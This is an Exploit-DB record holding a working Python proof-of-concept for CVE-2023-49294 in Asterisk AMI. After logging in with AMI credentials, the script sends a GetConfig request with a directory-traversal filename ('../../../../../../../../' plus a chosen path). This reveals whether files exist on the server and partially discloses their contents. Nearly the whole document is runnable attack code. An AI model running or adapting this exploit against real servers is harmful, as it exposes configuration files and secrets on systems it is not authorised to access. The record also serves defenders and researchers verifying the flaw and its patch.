{"source": "https://www.exploit-db.com/exploits/51927", "vulnName": "Asterisk AMI - Partial File Content & Path Disclosure (Authenticated)", "vulnEDBID": "51927", "vulnCVE": "N/A", "author": "SEAN PESCE", "exploitType": "REMOTE", "platform": "MULTIPLE", "datePublished": "2024-03-28", "vulnContent": "# Exploit Title: Asterisk AMI - Partial File Content & Path Disclosure (Authenticated)\n# Date: 2023-03-26\n# Exploit Author: Sean Pesce\n# Vendor Homepage: https://asterisk.org/\n# Software Link: https://downloads.asterisk.org/pub/telephony/asterisk/old-releases/\n# Version: 18.20.0\n# Tested on: Debian Linux\n# CVE: CVE-2023-49294\n\n#!/usr/bin/env python3\n#\n# Proof of concept exploit for CVE-2023-49294, an authenticated vulnerability in Asterisk AMI that\n# facilitates filesystem enumeration (discovery of existing file paths) and limited disclosure of\n# file contents. Disclosed files must adhere to the Asterisk configuration format, which is similar\n# to the common INI configuration format.\n#\n# References:\n#   https://nvd.nist.gov/vuln/detail/CVE-2023-49294\n#   https://github.com/asterisk/asterisk/security/advisories/GHSA-8857-hfmw-vg8f\n#   https://docs.asterisk.org/Asterisk_18_Documentation/API_Documentation/AMI_Actions/GetConfig/\n\n\nimport argparse\nimport getpass\nimport socket\nimport sys\n\n\nCVE_ID = 'CVE-2023-49294'\n\nDEFAULT_PORT = 5038\nDEFAULT_FILE = '/etc/hosts'\nDEFAULT_ACTION_ID = 0\nDEFAULT_TCP_READ_SZ = 1048576  # 1MB\n\n\n\ndef ami_msg(action, args, encoding='utf8'):\n    assert type(action) == str, f'Invalid type for AMI Action (expected string): {type(action)}'\n    assert type(args) == dict, f'Invalid type for AMI arguments (expected dict): {type(args)}'\n    if 'ActionID' not in args:\n        args['ActionID'] = 0\n    line_sep = '\\r\\n'\n    data = f'Action: {action}{line_sep}'\n    for a in args:\n        data += f'{a}: {args[a]}{line_sep}'\n    data += line_sep\n    return data.encode(encoding)\n\n\n\ndef tcp_send_rcv(sock, data, read_sz=DEFAULT_TCP_READ_SZ):\n    assert type(data) in (bytes, bytearray, memoryview), f'Invalid data type (expected bytes): {type(data)}'\n    sock.sendall(data)\n    resp = b''\n    while not resp.endswith(b'\\r\\n\\r\\n'):\n        resp += sock.recv(read_sz)\n    return resp\n\n\n\nif __name__ == '__main__':\n    # Parse command-line arguments\n    argparser = argparse.ArgumentParser()\n    argparser.add_argument('host', type=str, help='The host name or IP address of the Asterisk AMI server')\n    argparser.add_argument('-p', '--port', type=int, help=f'Asterisk AMI TCP port (default: {DEFAULT_PORT})', default=DEFAULT_PORT)\n    argparser.add_argument('-u', '--user', type=str, help=f'Asterisk AMI user', required=True)\n    argparser.add_argument('-P', '--password', type=str, help=f'Asterisk AMI secret', default=None)\n    argparser.add_argument('-f', '--file', type=str, help=f'File to read (default: {DEFAULT_FILE})', default=DEFAULT_FILE)\n    argparser.add_argument('-a', '--action-id', type=int, help=f'Action ID (default: {DEFAULT_ACTION_ID})', default=DEFAULT_ACTION_ID)\n    if '-h' in sys.argv or '--help' in sys.argv:\n        print(f'Proof of concept exploit for {CVE_ID} in Asterisk AMI. More information here: \\nhttps://nvd.nist.gov/vuln/detail/{CVE_ID}\\n', file=sys.stderr)\n        argparser.print_help()\n        sys.exit(0)\n    args = argparser.parse_args()\n\n    # Validate command-line arguments\n    assert 1 <= args.port <= 65535, f'Invalid port number: {args.port}'\n    args.host = socket.gethostbyname(args.host)\n    if args.password is None:\n        args.password = getpass.getpass(f'[PROMPT] Enter the AMI password for {args.user}: ')\n\n    print(f'[INFO] Proof of concept exploit for {CVE_ID}', file=sys.stderr)\n    print(f'[INFO] Connecting to Asterisk AMI:  {args.user}@{args.host}:{args.port}', file=sys.stderr)\n\n    # Connect to the Asterisk AMI server\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n    sock.connect((args.host, args.port))\n\n    # Read server banner\n    banner = sock.recv(DEFAULT_TCP_READ_SZ)\n    print(f'[INFO] Connected to {banner.decode(\"utf8\").strip()}', file=sys.stderr)\n\n    # Authenticate to the Asterisk AMI server\n    login_msg = ami_msg('Login', {'Username':args.user,'Secret':args.password})\n    login_resp = tcp_send_rcv(sock, login_msg)\n    while b'Authentication' not in login_resp:\n        login_resp = tcp_send_rcv(sock, b'')\n    if b'Authentication accepted' not in login_resp:\n        print(f'\\n[ERROR] Invalid credentials: \\n{login_resp.decode(\"utf8\")}', file=sys.stderr)\n        sys.exit(1)\n    #print(f'[INFO] Authenticated: {login_resp.decode(\"utf8\")}', file=sys.stderr)\n    print(f'[INFO] Login success', file=sys.stderr)\n\n    # Obtain file data via path traversal\n    traversal = '../../../../../../../../'\n    cfg_msg = ami_msg('GetConfig', {\n        'ActionID': args.action_id,\n        'Filename': f'{traversal}{args.file}',\n        #'Category': 'default',\n        #'Filter': 'name_regex=value_regex,',\n    })\n    resp = tcp_send_rcv(sock, cfg_msg)\n    while b'Response' not in resp:\n        resp = tcp_send_rcv(sock, b'')\n\n    print(f'', file=sys.stderr)\n    print(f'{resp.decode(\"utf8\")}')\n\n    if b'Error' in resp:\n        sys.exit(1)\n\n    pass  # Done\n            "}